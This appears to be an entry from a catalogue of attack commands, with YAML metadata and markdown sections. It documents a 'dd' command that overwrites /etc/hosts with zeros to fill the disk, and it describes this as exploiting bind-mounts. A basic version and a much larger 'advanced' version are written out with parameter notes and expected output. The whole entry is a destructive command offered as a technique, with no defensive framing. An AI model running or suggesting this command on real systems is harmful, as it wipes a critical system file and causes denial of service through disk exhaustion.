---
data: dd if=/dev/zero of=/etc/hosts count=100 bs=1M
tags:
  - disk-exhaustion
type: command
output: |-
  100+0 records in
  100+0 records out
executor: bash
platforms:
  - Linux
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:56.596Z'
id: f948710a-9117-4fae-9a9b-97ca28066af3
verified: false
validated: true
submitted: true
---
# dd-fill-etc-hosts

## Command

```bash
dd if=/dev/zero of=/etc/hosts count=100 bs=1M
```

## Description

Copies data from /dev/zero to /etc/hosts to inflate file size and exhaust disk, exploiting bind-mounts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| if=/dev/zero | Input file of infinite zeros | Yes |
| of=/etc/hosts | Output file to write | Yes |
| count=100 | Number of blocks | Yes |
| bs=1M | Block size (1MB) | Yes |

## Examples

### Basic Usage

```bash
dd if=/dev/zero of=/etc/hosts count=100 bs=1M
```

### Advanced Usage

```bash
dd if=/dev/zero of=/etc/hosts count=1000000 bs=10M
```

## Expected Output

Records in/out counts until complete or disk full.

## Related

- [[procedures/Overwrite-Etc-Hosts-with-Dd]]
